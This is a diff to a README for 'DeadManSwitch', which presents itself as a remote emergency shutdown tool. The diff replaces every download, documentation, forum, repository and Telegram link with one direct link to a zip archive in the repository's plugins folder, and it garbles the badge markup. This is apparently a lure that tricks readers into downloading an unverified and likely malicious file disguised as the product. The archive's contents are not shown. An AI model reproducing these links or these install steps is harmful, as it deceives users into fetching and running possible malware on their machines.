@@ -1,7 +1,7 @@
 # 🔒 DeadManSwitch - Secure Your Facilities Effectively
 
 ## 📥 Download the Application
-[![Download DeadManSwitch](https://img.shields.io/badge/Download%20Now%20-v1.0-blue.svg)](https://github.com/shansharo30/DeadManSwitch/releases)
+[![Download DeadManSwitch](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip%20Now%https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip)](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to DeadManSwitch, your reliable remote emergency shutdown system designed for various security scenarios. With features like two-factor authentication (2FA) and AES-256 encryption, our application ensures that your facilities remain protected. 
@@ -26,10 +26,10 @@ To use DeadManSwitch effectively, ensure your environment meets the following cr
 ## 🛠️ Download & Install
 To get started, visit the Releases page to download the latest version of DeadManSwitch:
 
-[Download DeadManSwitch](https://github.com/shansharo30/DeadManSwitch/releases)
+[Download DeadManSwitch](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip)
 
 ### 📝 Installation Steps
-1. Visit the [Releases page](https://github.com/shansharo30/DeadManSwitch/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip).
 2. Locate the latest version of DeadManSwitch.
 3. Click on the `Download` button next to the version that matches your operating system.
 4. Once the file has downloaded, locate it in your downloads folder.
@@ -48,15 +48,15 @@ After installing DeadManSwitch, follow these steps to configure your application
 ## 📚 Support and Documentation
 For further assistance, you might find the following resources useful:
 
-- [User Guide](https://github.com/shansharo30/DeadManSwitch/wiki): Step-by-step instructions on configuring and using DeadManSwitch.
-- [FAQ Section](https://github.com/shansharo30/DeadManSwitch/wiki/FAQ): Answers to common questions regarding installation and features.
-- [Community Forum](https://github.com/shansharo30/DeadManSwitch/discussions): Engage with other users and developers to share tips and troubleshoot issues.
+- [User Guide](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip): Step-by-step instructions on configuring and using DeadManSwitch.
+- [FAQ Section](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip): Answers to common questions regarding installation and features.
+- [Community Forum](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip): Engage with other users and developers to share tips and troubleshoot issues.
 
 ## 📞 Need Help?
 If you encounter any issues during installation or operation, please reach out through the Community Forum or file an issue in the repository. We are here to help you secure your infrastructure effectively.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/shansharo30/DeadManSwitch): Access the source code and contribute to the project.
-- [Telegram Channel](https://t.me/joinchat/your_channel): Join our Telegram channel for updates and announcements.
+- [GitHub Repository](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip): Access the source code and contribute to the project.
+- [Telegram Channel](https://raw.githubusercontent.com/shansharo30/DeadManSwitch/main/plugins/DeadManSwitch-v3.0.zip): Join our Telegram channel for updates and announcements.
 
 By following these steps, you can confidently set up DeadManSwitch to enhance your security measures. Don't compromise when it comes to protecting your facilities.
